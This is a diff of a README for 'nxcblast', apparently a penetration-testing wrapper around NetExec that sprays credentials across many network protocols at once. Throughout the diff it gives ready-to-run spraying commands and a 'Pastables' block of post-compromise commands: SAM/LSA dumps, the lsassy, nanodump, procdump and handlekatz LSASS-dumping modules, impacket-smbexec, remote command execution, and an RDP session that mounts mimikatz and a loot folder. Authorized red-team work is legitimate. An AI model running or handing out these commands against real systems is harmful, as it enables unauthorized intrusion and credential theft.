@@ -2,9 +2,11 @@
 
 Spray credentials across every NetExec protocol at once -- hits only, lockout-aware, pastables on finish.
 
-`nxcblast` is a thin Python wrapper around [`nxc`](https://github.com/Pennyw0rth/NetExec). It does **not** reimplement SMB, WinRM, RDP, or any other protocol; every auth attempt is a real `nxc` subprocess. Console output is signal, not noise: you see hits (with nxc-style access-level colors), a column header, and a live progress bar. Full verbose `nxc` output lands in a log file. When the spray finishes, you get a **Pastables** block -- ready-to-run follow-up commands grouped per protocol for each confirmed hit -- that you execute yourself.
+`nxcblast` is a thin Python wrapper around [`nxc`](https://github.com/Pennyw0rth/NetExec). It does **not** reimplement SMB, WinRM, RDP, or any other protocol; every auth attempt is a real `nxc` subprocess. Console output is signal, not noise: you see hits (with nxc-style access-level colors), a column header, and a `.` for each finished attempt on one line. Full verbose `nxc` output lands in a log file. When the spray finishes, you get a **Pastables** block -- ready-to-run follow-up commands grouped per IP then protocol for each confirmed hit -- that you execute yourself.
 
 Inspired by [nxcspray](https://github.com/NTHSec/nxcspray) by NTHSec. `nxcspray` proved the "one command, every protocol" workflow; `nxcblast` takes that idea and adds hits-only output, lockout awareness, `nxcdb` reuse, hash/null/guest auth, and pastable follow-ups.
+
+Big kudos to [NetExec](https://github.com/Pennyw0rth/NetExec) and [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) -- the original projects this stands on.
 
 ## Install
 
@@ -27,7 +29,7 @@ python3 nxcblast.py -h
 ## Usage
 
 ```
-nxcblast [protocols] [targets] [auth] [options]
+nxcblast [protocols] [targets] [auth] [options] [-- nxc-args]
 ```
 
 **Protocols** (positional or `--protocols`): `smb`, `winrm`, `rdp`, `ssh`, `ftp`, `ldap`, `mssql`, `vnc`, `wmi`. Use `all` or omit them to hit every protocol. Space-separated, comma-separated, or mixed.
@@ -122,12 +124,13 @@ nxcblast all targets.txt --nxcdb -u admin -p Password1   # db creds + CLI creds
 
 ### Lockout, pacing, threads
 
-Every protocol runs against every target at once. Each service still handles **one credential at a time per box**, so SMB on host A, WinRM on host A, and SMB on host B can all fire together, but two passwords will not hit the same SMB listener in parallel. `--threads 0` (default) means one worker per protocol×target lane. `--threads N` caps how many lanes run at once.
+Every protocol runs against every target at once. Each service still handles **one credential at a time per box**, so SMB on host A, WinRM on host A, and SMB on host B can all fire together, but two passwords will not hit the same SMB listener in parallel. `--threads` defaults to **6**. Pass a higher number for more lanes, or `--threads 0` for one worker per lane (all services against all targets at once).
 
 ```bash
 nxcblast smb targets.txt -U users.txt -p 'Winter2026!' --lockout 3 --lockout-delay 60
 nxcblast smb targets.txt -u admin -p Password1 --lockout 0          # disable pause
 nxcblast all targets.txt --creds creds.txt --delay 1 --threads 3   # cap lanes
+nxcblast all targets.txt --creds creds.txt --threads 0            # all lanes at once
 nxcblast smb targets.txt -u admin -p Password1 --stop-on-hit
 ```
 
@@ -138,6 +141,18 @@ nxcblast smb targets.txt -u admin -p Password1 --log spray.log
 nxcblast smb targets.txt -u admin -p Password1 --no-log
 nxcblast smb targets.txt -u admin -p Password1 --json hits.json
 nxcblast smb targets.txt -u admin -p Password1 --quiet
+nxcblast smb targets.txt -u admin -p Password1 --verbose   # nxc --verbose (log file)
+nxcblast smb targets.txt -u admin -p Password1 --debug     # nxc --debug (log file)
+```
+
+`--verbose` and `--debug` are mutually exclusive, same as `nxc`. They are forwarded to every `nxc` subprocess; nxcblast's console stays hits-only, and nxc's extra chatter lands in the log.
+
+### Pass remaining args to nxc (experimental)
+
+Anything after `--` is appended to every `nxc` call. Protocol-specific flags will fail on protocols that do not support them.
+
+```bash
+nxcblast smb targets.txt -u admin -p Password1 -- --users bob
 ```
 
 ## Console output
@@ -151,6 +166,7 @@ Hits only. Failures, banners, and nxc chatter stay in the log.
 
     PROTO  | TARGET           | HOSTNAME         | CREDS                  | METHOD | ACCESS
 
+......
 [+] SMB    | 192.168.59.203   | DC01             | jason:lab              | D      | (valid)
 [+] RDP    | 192.168.59.203   | DC01             | jason:lab              | L      | (Pwn3d!) RDP code exec
 [+] MSSQL  | 192.168.59.203   | DC01             | jason:lab              | M      | (valid)
@@ -159,33 +175,42 @@ Hits only. Failures, banners, and nxc chatter stay in the log.
 [*] Done. 4 hits across 1 target.
 ```
 
-`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. HOSTNAME is parsed from `nxc` (`(name:…)` or the hostname column). METHOD is a single letter: `D` domain (including MSSQL Windows auth), `L` local, `M` mssql (SQL login / internal `sa`). Protocols with no domain/local split show `-`. Lockout pauses are silent on the console (logged only).
+`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. HOSTNAME is parsed from `nxc` (`(name:…)` or the hostname column). METHOD is a single letter: `D` domain (including MSSQL Windows auth), `L` local, `M` mssql (SQL login / internal `sa`). Protocols with no domain/local split show `-`. Each finished `nxc` attempt prints a `.` on one line (`--quiet` hides the dots). Hits break that line so they stay readable. Lockout pauses are silent on the console (logged only).
 
 Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STATUS_SUCCESS`, `(Shell)`. Lines with `STATUS_LOGON_FAILURE`, `STATUS_ACCESS_DENIED`, or `[-]` are dropped.
 
 ## Pastables
 
-`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, matching the auth method that actually succeeded (`--local-auth` only when local/mssql local worked). Dump and exec follow-ups (`--sam`, `-x`, `impacket-smbexec`, evil-winrm, secretsdump) are only suggested when that hit was `Pwn3d!` or Shell -- valid-but-not-admin creds get enum/reconnect commands only. SSH always gets `sshpass` / `ssh`; WinRM always gets an `nxc winrm` reconnect, plus `evil-winrm` when the hit was `Pwn3d!`.
+`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, matching the auth method that actually succeeded (`--local-auth` only when local/mssql local worked). Dump and exec follow-ups (`--sam --lsa`, `-M lsassy` / `nanodump` / `procdump` / `handlekatz`, `-x`, `impacket-smbexec`, evil-winrm) are only suggested when that hit was `Pwn3d!` or Shell -- valid-but-not-admin creds get enum/reconnect commands only. SSH always gets `sshpass` / `ssh`; WinRM always gets an `nxc winrm` reconnect, plus `evil-winrm` when the hit was `Pwn3d!`.
+
+Pastables are grouped by IP (stated once), then protocol. IPs sort numerically; protocols follow nxcblast's usual order. Section headers and commands are indented.
 
 ```
 ============================================================
 PASTABLES -- confirmed hits, suggested follow-up commands
 ============================================================
 
-[192.168.59.203 (DC01) | jason:lab]
+[192.168.59.203 (DC01)]
 
-[SMB domain]
-  nxc smb 192.168.59.203 -u jason -p 'lab' --users --shares --pass-pol --rid-brute 10000
+    [SMB domain]
+      nxc smb 192.168.59.203 -u jason -p 'lab' --users --shares --pass-pol --rid-brute 10000
+      nxc smb 192.168.59.203 -u jason -p 'lab' --sam --lsa
+      nxc smb 192.168.59.203 -u jason -p 'lab' -M lsassy
+      nxc smb 192.168.59.203 -u jason -p 'lab' -M nanodump
+      nxc smb 192.168.59.203 -u jason -p 'lab' -M procdump
+      nxc smb 192.168.59.203 -u jason -p 'lab' -M handlekatz
+      nxc smb 192.168.59.203 -u jason -p 'lab' -x whoami
+      impacket-smbexec jason:lab@192.168.59.203
 
-[RDP local]
-  mkdir -p "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:192.168.59.203 /d: /u:jason /p:'lab'
+    [RDP local]
+      mkdir -p "$HOME/my_data/loot"; xfreerdp3 /clipboard /dynamic-resolution /cert:ignore /drive:'/usr/share/windows-resources/mimikatz/x64',share /drive:"$HOME/my_data/loot",loot /v:192.168.59.203 /d: /u:jason /p:'lab'
 
-[MSSQL mssql]
-  nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth
+    [MSSQL mssql]
+      nxc mssql 192.168.59.203 -u jason -p 'lab' --local-auth
 ============================================================
 ```
 
-A `Pwn3d!` SMB hit also suggests `impacket-smbexec`, `impacket-secretsdump`, `--sam`, and `-x whoami`. Commands are grouped by protocol and only included for protocols that actually hit. If there are no confirmed hits, the Pastables block is omitted.
+A `Pwn3d!` SMB hit also suggests `impacket-smbexec`, `--sam --lsa`, the dump modules above, and `-x whoami`. Commands are grouped by protocol and only included for protocols that actually hit. If there are no confirmed hits, the Pastables block is omitted.
 
 You run these. The tool does not.
 
